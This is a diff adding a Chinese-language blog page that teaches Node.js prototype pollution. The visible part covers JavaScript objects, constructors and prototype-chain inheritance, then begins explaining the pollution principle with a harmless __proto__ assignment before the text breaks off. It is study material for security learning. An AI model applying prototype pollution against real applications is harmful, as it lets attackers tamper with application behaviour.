@@ -1,0 +1,1084 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="基础知识原型链原型和原型链都是来源于对象而服务于对象的概念，所以我们从对象讲起。 在 JavaScript 中，数据类型分为两大类：  基本类型（值类型）：如 number、string、boolean、undefined、null、symbol、bigint 引用类型：如 Object、Array、Function、Date、RegExp、Error 等  这里的“引用类型”，其实都是以 Obj">
+<meta property="og:type" content="article">
+<meta property="og:title" content="node.js原型链污染学习总结">
+<meta property="og:url" content="http://example.com/2025/07/13/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="基础知识原型链原型和原型链都是来源于对象而服务于对象的概念，所以我们从对象讲起。 在 JavaScript 中，数据类型分为两大类：  基本类型（值类型）：如 number、string、boolean、undefined、null、symbol、bigint 引用类型：如 Object、Array、Function、Date、RegExp、Error 等  这里的“引用类型”，其实都是以 Obj">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132246022.png">
+<meta property="article:published_time" content="2025-07-13T14:36:00.000Z">
+<meta property="article:modified_time" content="2025-07-13T14:46:08.132Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="学习总结">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132246022.png">
+  
+  
+  
+  <title>node.js原型链污染学习总结 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="node.js原型链污染学习总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-13 22:36" pubdate>
+          2025年7月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">node.js原型链污染学习总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>原型和原型链都是来源于对象而服务于对象的概念，所以我们从对象讲起。</p>
+<p>在 JavaScript 中，数据类型分为两大类：</p>
+<ul>
+<li><strong>基本类型（值类型）</strong>：如 number、string、boolean、undefined、null、symbol、bigint</li>
+<li><strong>引用类型</strong>：如 Object、Array、Function、Date、RegExp、Error 等</li>
+</ul>
+<p>这里的“引用类型”，其实都是以 Object（对象）为基础的。也就是说，<strong>除了基本类型，其他在 JS 中的值本质上都是对象</strong>，数组是对象、函数是对象、正则是对象、对象还是对象。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> arr = [];           <span class="hljs-comment">// 数组，其实是对象</span><br><span class="hljs-keyword">let</span> fn = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// 函数，其实也是对象</span><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;           <span class="hljs-comment">// 对象，还是对象</span><br><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>)    <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fn <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>)     <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>)    <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>JavaScript中一切引用类型都是对象</strong>，那对象是什么？</p>
+<p>在 JavaScript 中，“对象”可以看作是<strong>一组“键值对”（属性）的无序集合</strong>。每一个属性都由“名字”（key）和“值”（value）组成：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-keyword">let</span> person <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-params">name:</span> <span class="hljs-string">&quot;matrix&quot;</span>,<br>  <span class="hljs-params">age:</span> <span class="hljs-number">20</span>,<br>  <span class="hljs-params">kid:</span> &#123;&#125;,<br>  <span class="hljs-params">say:</span> function() &#123;<br>    console.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>这里，<code>person</code> 对象有四个属性：<code>name</code> 、 <code>age</code>、 <code>kid</code>、 <code>say</code></p>
+<ul>
+<li>属性名是字符串</li>
+<li>属性值可以是任意类型（包括对象、函数、数组、number等）</li>
+</ul>
+<p>所以，<strong>对象就是属性的集合</strong></p>
+<p>现在我们知道了什么是对象，以及对象是什么，那对象是怎么创建的呢？</p>
+<p>这就要提到构造器函数了。</p>
+<p><strong>构造器函数（Constructor Function）</strong>：用于创建对象的普通函数，通常首字母大写。</p>
+<p>顾名思义，构造器函数本身只是一个函数，只不过特殊一点（用来创建类的）。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> Person(<span class="hljs-type">name</span>, age) &#123;<br>  this.name = <span class="hljs-type">name</span>;<br>  this.age = age;<br>&#125;<br>console.log(<span class="hljs-built_in">new</span> Person(&quot;matrix&quot;, <span class="hljs-number">20</span>))//Person &#123; <span class="hljs-type">name</span>: <span class="hljs-string">&#x27;matrix&#x27;</span>, age: <span class="hljs-number">20</span> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过 <code>new Person(&quot;matrix&quot;, 20)</code> 创建实例对象。</p>
+<p>这里要注意，像我们直接写出来的<code>Person</code>，不论是<code>function Person(...)&#123;...&#125;</code>还是<code>new Person(...)</code>，都是指构造器函数。</p>
+<p>我们这里引出原型对象的概念，</p>
+<p><strong>原型对象</strong>：每个构造函数（包括 class、普通函数）都有一个名为 <code>.prototype</code> 的属性，这个属性指向一个对象，这个对象就叫“原型对象”。</p>
+<p>通过构造函数（或 class）<code>new</code> 出来的实例对象，都会自动把自己的 <code>__proto__</code> 属性指向构造函数的 prototype（即原型对象）。</p>
+<p>注意，实例对象的 <code>__proto__</code> 属性与构造函数的 <code>prototype</code> 的属性都指向同一个东西，即原型对象。</p>
+<p>（原型指的是“构造函数的 prototype 属性”，它本质上是一个对象，故称为“原型对象”。这里原型与原型对象是一个东西，只是叫法不同，不做区分）</p>
+<p>用下面代码理解一下</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  this.name = name;<br>  this.age = age;<br>&#125;<br>let me = <span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;matrix&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me)                            <span class="hljs-comment">//Person &#123; name: &#x27;matrix&#x27;, age: 20 &#125;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.__proto__)                  <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(Person.prototype)              <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.__proto__.constructor)      <span class="hljs-comment">//[Function: Person]</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现，实例对象me的 <code>__proto__</code> 属性与构造函数Person的 <code>prototype</code> 的属性都指向一个空对象，但是这个空对象有一个默认的 constructor 属性指回Person 函数本身。</p>
+<p>我们知道了实例对象me的原型对象，那原型对象的原型是啥？</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> me = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;matrix&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me)                                   <span class="hljs-comment">//Person &#123; name: &#x27;matrix&#x27;, age: 20 &#125;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me.<span class="hljs-property">__proto__</span>)                         <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)               <span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)                     <span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)     <span class="hljs-comment">//null</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)                     <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)           <span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>)           <span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>) <span class="hljs-comment">//null</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现，空对象<code>&#123;&#125;</code>的原型是<code>Object.prototype</code>，是<strong>JavaScript 所有“普通对象”最终继承的顶级原型对象</strong>。</p>
+<p>换句话说，几乎所有通过 <code>&#123;&#125;</code>、<code>new Object()</code>、构造函数（比如 <code>function Animal()&#123;&#125;</code>）等方式创建的对象，最终其原型链都会指向 <code>Object.prototype</code>。</p>
+<p>注意，<code>[Object: null prototype] &#123;&#125;</code> 是指<strong>没有原型的对象</strong>，这种对象的原型是 <code>null</code>，但<strong>它不是普通对象的顶级原型对象</strong>，只是一个“纯净字典”对象。</p>
+<p>在 Node.js 或部分现代 JavaScript 环境下，console.log 打印的对象如果它的原型是 <strong>null</strong>，会显示 <code>[Object: null prototype] &#123;&#125;</code>。</p>
+<p><code>[Object: null prototype] &#123;&#125;</code> 可以指两种情况：</p>
+<ol>
+<li><p>Object.create(null) 创建的对象</p>
+<p>这是“纯净字典”，没有任何继承。仅仅是自己的属性，没有任何内置方法。</p>
+</li>
+<li><p>Object.prototype 本身**</p>
+<p>它也是一个对象，<code>__proto__</code> 也是 <code>null</code>。但它<strong>自带一堆方法和属性</strong>（如 <code>toString</code>、<code>hasOwnProperty</code> 等），这些是它本身定义的，不是继承来的。</p>
+</li>
+</ol>
+<p><code>Object.prototype</code> 上定义了一些所有对象都能用的方法，例如：</p>
+<ul>
+<li><code>toString()</code></li>
+<li><code>hasOwnProperty()</code></li>
+<li><code>isPrototypeOf()</code></li>
+<li><code>valueOf()</code></li>
+<li><code>propertyIsEnumerable()</code></li>
+<li><code>toLocaleString()</code></li>
+<li>…等</li>
+</ul>
+<p>这些方法是所有“普通对象”都能直接访问的，因为它们继承自 <code>Object.prototype</code>。</p>
+<p>而在往上呢？</p>
+<p><code>Object.prototype</code> 本身是一个对象，但它的 <code>__proto__</code> 是 <code>null</code>，即原型链的终点。</p>
+<p>我们可以这样理解，<code>Object.prototype</code> 没有继承自任何对象，它的原型是 <code>null</code>，即原型链的终点。</p>
+<p>我们再理一下整条链子</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elm">实例对象me<br>  ↓ __proto__<br><span class="hljs-type">Person</span>.proto<span class="hljs-keyword">type</span><br>  ↓ __proto__<br><span class="hljs-type">Object</span>.proto<span class="hljs-keyword">type</span><br>  ↓ __proto__<br><span class="hljs-title">null</span><br></code></pre></td></tr></table></figure>
+
+<p>实例对象的原型，原型的原型……这样一层层往上，就构成了一条链子，这就是原型链。</p>
+<p><strong>原型链</strong>是 JavaScript 实现对象继承的一种机制。它是一种对象之间的链式结构，每个对象都通过其内部的 <code>[[Prototype]]</code>（即 <code>__proto__</code>）属性指向另一个对象，这个被指向的对象叫“原型对象（prototype）”。这样层层向上，最终指向 <code>Object.prototype</code>，其 <code>__proto__</code> 为 <code>null</code>，链条至此结束。</p>
+<p>以下面代码和图片为例，讲解一下整个原型链</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Monster</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, hp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hp</span> = hp;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">g</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ggg&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在下面链子中，Function是顶层构造器，Object是顶层原型对象。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132246022.png" srcset="/img/loading.gif" lazyload alt="image-20250709221427817"></p>
+<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><p>下面我们再提一下JavaScript里类的概念。</p>
+<p>早期 JavaScript 没有“类”概念：JavaScript 设计之初（1995年），只有<strong>构造函数</strong>和<strong>原型对象</strong>，没有 class 关键字，也没有类的语法。对象的继承、方法的复用，都是通过<strong>构造函数 + 原型链</strong>来实现的。</p>
+<p>早期的“类”写法其实是用函数和原型对象模拟出来的，实际底层还是对象和原型链。</p>
+<p><strong>ES6（2015）正式引入了 <code>class</code> 关键字</strong>，让语法更像面向对象语言。但本质上，JavaScript 的 class 只是语法糖，底层依然是原型继承实现。也就是说，ES6 的 class 并没有改变 JS 的对象模型，只是让“面向对象”写法更优雅易懂。</p>
+<p>JavaScript 的 <code>class</code> 关键字是为了符合大众的写法特意实现的语法，故称语法糖，本质上还是构造器函数+原型对象的封装。</p>
+<p>所以说，类由构造器和原型对象组成，通过构造器实例化得到对象，实例对象通过原型链继承原型对象上的方法和属性。</p>
+<p>我们用类重新实现一下上面，是不是顺眼许多：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">age</span>);  <span class="hljs-comment">// 18</span><br></code></pre></td></tr></table></figure>
+
+<p>类名（如 <code>Person</code>）本身是构造器函数，不是原型对象。原型对象是 <code>Person.prototype</code>。实例对象的 <code>__proto__</code> 指向 <code>Person.prototype</code>，实现继承。</p>
+<p>注意：</p>
+<p>类名&#x3D;构造器；</p>
+<p>实例对象的 <code>__proto__</code> &#x3D;构造函数<code>prototype</code>&#x3D;原型或原型对象。</p>
+<h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制，比如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>) <span class="hljs-comment">// Name: Melania Trump</span><br></code></pre></td></tr></table></figure>
+
+<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
+<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<p>总的来讲，当访问一个实例对象的属性时，先在对象的本身找，找不到就去对象的原型上找，如果还是找不到，就去对象的原型（原型也是对象，也有它自己的原型）的原型上找，如此继续，直到找到为止，或者查找到最顶层的原型对象中也没有找到，就结束查找，返回undefined。</p>
+<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>说到，<code>me.__proto__</code>指向的是<code>Person</code>类的<code>prototype</code>。那么，如果我们修改了<code>me.__proto__</code>中的值，是不是修改的person类呢？</p>
+<p>做个简单的实验：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// me是一个简单的JavaScript对象</span><br>let me = &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;matrix&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>&#125;<br><span class="hljs-comment">// me.age 此时为20</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.age)<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.__proto__) <span class="hljs-comment">// [Object: null prototype] &#123;&#125;</span><br><span class="hljs-comment">// 修改me的原型（即Object）</span><br>me.__proto__.age = <span class="hljs-number">18</span><br><span class="hljs-comment">// 由于查找顺序的原因，me.age仍然是20</span><br><span 